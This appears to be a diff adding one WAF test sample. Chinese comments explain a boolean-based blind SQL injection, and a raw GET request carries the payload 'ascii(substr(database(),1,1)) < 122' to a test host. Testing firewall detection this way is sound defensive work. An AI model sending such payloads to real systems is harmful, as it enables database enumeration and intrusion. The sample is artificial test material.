@@ -1,0 +1,10 @@
+# SQL注入_GET_mysql_布尔注入-06506244
+# 基于布尔注入,该SQL注入语句的攻击手法是通过逐个字符地查询当前使用的数据库名称，并判断其第一个字符的 ASCII 值是否小于 122。在该sql注入语句中，"ascii(substr(database(),1,1)) < 122": 此部分利用数据库的 substr() 函数和 ascii() 函数，逐个获取数据库名称的字符，并将第一个字符的 ASCII 值与 122 进行对比。如果返回结果为真，则说明数据库名称的第一个字符的 ASCII 值小于 122。
+# 攻击者可以通过逐个字符地判断数据库名称的第一个字符，以确定数据库的类型或其他相关信息。这为进一步的攻击行为提供了基础，例如利用特定数据库的已知漏洞或进行有针对性的攻击。
+GET /?id=1%20and%20ascii%28substr%28database%28%29%2C1%2C1%29%29%20%3C%20122%20&bid=hd_tag_m8mv24e9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24e9
+RM-PRO-Token: 88cf5294c9cd2f334222bb366e2ad8a4
+RM-PRO-Time: 1742808378008
+User-Agent: curl/7.83.1
+
